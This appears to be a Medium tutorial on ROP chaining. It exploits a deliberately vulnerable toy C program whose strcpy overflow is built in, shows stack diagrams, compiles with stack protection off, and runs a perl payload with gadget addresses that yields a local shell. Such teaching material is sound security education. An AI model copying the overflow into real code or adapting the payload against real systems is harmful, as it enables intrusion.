@@ -1,0 +1,162 @@
+Become a member
+Sign in
+Get started
+Return-Oriented Programming — ROP Chaining
+ka1d0
+ka1d0
+Follow
+Feb 11 · 5 min read
+We have already looked at return-to-libc attack in one of my previous articles. Return-to-libc attack is part of a concept called Return-Oriented Programming which basically utilizes code that is already present in the program. However, return-to-libc allows for pivoting into only one other function. In the return-to-libc article, I pivoted into system() to launch the shell.
+ROP chaining is an extension of return-to-libc and allows for pivoting across multiple (arbitrary) functions. Like return-to-libc, it bypasses DEP.
+Credits: I haven’t worked on this exploit as part of any of my projects. I’ve picked up the vulnerable program from a blog post about ROP.
+
+ROP Chaining
+Consider the following vulnerable program:
+nikhilh@ubuntu:~/rop$ cat rop.c
+char string[100];
+void exec_string() {
+system(string);
+}
+void add_bin(int magic) {
+if (magic == 0xdeadbeef) {
+strcat(string, “/bin”);
+}
+}
+void add_sh(int magic1, int magic2) {
+if (magic1 == 0xcafebabe && magic2 == 0x0badf00d) {
+strcat(string, “/sh”);
+}
+}
+void vulnerable_function(char* string) {
+char buffer[100];
+strcpy(buffer, string);
+}
+int main(int argc, char** argv) {
+string[0] = 0;
+vulnerable_function(argv[1]);
+return 0;
+}
+In the above program, we can see that it can be easily exploited with a return-to-libc attack. Since this article is specifically about ROP, we’ll concentrate on that.
+Notice that exec_string() contains a call to system(), but the variable, string does not hold a value of "/bin/sh". For string to have this value, we need to access add_bin() and add_sh() functions in order. In other words, we need to pivot across multiple functions and hence the need for ROP chaining.
+Fundamental Idea
+Software attacks like return-to-libc and ROP chaining are based on the idea that the saved return address on the stack can be overwritten by a different address. When the function returns, %eip is loaded with the overwritten address rather than the original saved return address causing it to execute code determined by the attacker.
+ROP chaining, however, isn’t as straightforward as return-to-libc. To understand this, we’ll take a look at the expected stack structure when pivoting between functions. I’m assuming that you understand the C function calling mechanism very well.
+In the below stack diagram, higher memory addresses are at the top:
+| some value F
+| some value E
+| some value D
+| some value C
+| some value B
+| some value A
+| address of first argument, string S
+| saved return ptr of vulnerable_func() R
+The first function to pivot to, from vulnerable_function() is add_bin(). From the knowledge of C function call mechanism, we know that the value R must be overwritten with the memory address of add_bin(). The value, A would be the first argument to add_bin(), which needs to be equal to 0xdeadbeef (see code). The stack diagram would be:
+| some value F
+| some value E
+| some value D
+| some value C
+| some value B
+| 0xdeadbeef
+| first arg S
+| add_bin() address
+After executing add_bin(), our program should pivot to add_sh(). This means that the value of S must be equal to the memory address of add_sh(). However, also notice that exec_string() must be executed after add_sh() which means that the value of A must be equal to the memory address of exec_string(). This causes a conflict because the value of A must be equal to 0xdeadbeef for add_bin() to work correctly. If you find these relationships confusing, I suggest you understand the C function calling mechanism in depth.
+The conflict described above leads us to the principle of ROP chaining.
+The value of S is the main source of confusion at this point. We know that it cannot be equal to the memory address of add_sh(). However, we can overwrite the value of B with the memory address of add_sh() and force %eip to point to that address. %eip can be forced by executing pop-ret instructions immediately on exiting vulnerable_function(). (A pop-ret instruction represents a pop instruction followed by a ret instruction.)
+On executing ret at the end of vulnerable_function(), %esp would point to 0xdeadbeef. The pop instruction would pop 0xdeadbeef off the stack and %esp would now point to B, which is the memory address of add_sh(). On executing ret, %eip would enter add_sh(). The stack structure would now look like:
+| some value F
+| some value E
+| some value D
+| some value C
+| add_sh() address
+| 0xdeadbeef
+| address of a pop-ret instruction
+| add_bin() address
+This idea can be generalized. The number of pop instructions required before a ret instruction is equal to the number of arguments that the calling function accepts. In the above case, add_bin() called add_sh(). add_bin() accepted one argument and therefore, we required one pop instruction before a ret instruction.
+Expanding the same principle, we get the expected stack structure as:
+| exec_string() address
+| 0x0badf00d
+| 0xcafebabe
+| address of a pop-pop-ret instruction
+| add_sh() address
+| 0xdeadbeef
+| address of a pop-ret instruction
+| add_bin() address
+Exploit Code Construction
+Compilation
+nikhilh@ubuntu:~/rop$ gcc -m32 -fno-stack-protector -o rop rop.c
+rop.c: In function ‘exec_string’:
+rop.c:4:5: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
+system(string);
+^
+rop.c: In function ‘add_bin’:
+rop.c:9:9: warning: implicit declaration of function ‘strcat’ [-Wimplicit-function-declaration]
+strcat(string, “/bin”);
+^
+rop.c:9:9: warning: incompatible implicit declaration of built-in function ‘strcat’
+rop.c:9:9: note: include ‘’ or provide a declaration of ‘strcat’
+rop.c: In function ‘add_sh’:
+rop.c:15:9: warning: incompatible implicit declaration of built-in function ‘strcat’
+strcat(string, “/sh”);
+^
+rop.c:15:9: note: include ‘’ or provide a declaration of ‘strcat’
+rop.c: In function ‘vulnerable_function’:
+rop.c:21:5: warning: implicit declaration of function ‘strcpy’ [-Wimplicit-function-declaration]
+strcpy(buffer, string);
+^
+rop.c:21:5: warning: incompatible implicit declaration of built-in function ‘strcpy’
+rop.c:21:5: note: include ‘’ or provide a declaration of ‘strcpy’
+Exploit Code
+“A”x112 . “\x54\x84\x04\x08” . “\xed\x82\x04\x08” . “\xef\xbe\xad\xde” . “\x90\x84\x04\x08” . “\x8d\x84\x04\x08” . “\xbe\xba\xfe\xca” . “\x0d\xf0\xad\x0b” . “\x3b\x84\x04\x08”
+112 As overflows buffer and saved frame pointer, %ebp. pop-ret and pop-pop-ret instruction addresses can be found from the hex dump of the executable.
+Get that Shell!
+nikhilh@ubuntu:~/rop$ ./rop $(perl -e ‘print (“A”x112 . “\x54\x84\x04\x08” . “\xed\x82\x04\x08” . “\xef\xbe\xad\xde” . “\x90\x84\x04\x08” . “\x8d\x84\x04\x08” . “\xbe\xba\xfe\xca” . “\x0d\xf0\xad\x0b” . “\x3b\x84\x04\x08”)’)
+$ whoami
+nikhilh
+$ exit
+Segmentation fault (core dumped)
+Done!
+ROP chaining is a very simple technique if you understand the C function calling mechanism very well. It is especially useful to bypass ASLR if the code that you require is spread across different functions in the program.
+Thank you for reading! If you have any questions, leave them in the comments section below and I’ll get back to you as soon as I can!
+7
+Programming
+Exploit
+Vulnerability
+Hacking
+Cybersecurity
+7 claps
+
+ka1d0
+WRITTEN BY
+
+ka1d0
+Follow
+A budding malware analyst and threat researcher. https://www.linkedin.com/in/nikhilh2/
+Write the first response
+More From Medium
+Related reads
+Exploiting Regular Expressions
+Somdev Sangwan
+Somdev Sangwan
+Feb 23 · 5 min read
+466
+Related reads
+h1–702 CTF — Web Challenge Write Up
+Amal Murali
+Amal Murali
+Jul 1, 2018 · 12 min read
+1.1K
+Related reads
+Windows-Based Exploitation —VulnServer TRUN Command Buffer Overflow
+Andreas Poyiatzis
+Andreas Poyiatzis in InfoSec Write-ups
+May 30 · 6 min read
+285
+Discover Medium
+Welcome to a place where words matter. On Medium, smart voices and original ideas take center stage - with no ads in sight. Watch
+Make Medium yours
+Follow all the topics you care about, and we’ll deliver the best stories for you to your homepage and inbox. Explore
+Become a member
+Get unlimited access to the best stories on Medium — and support writers while you’re at it. Just $5/month. Upgrade
+About
+Help
+Legal
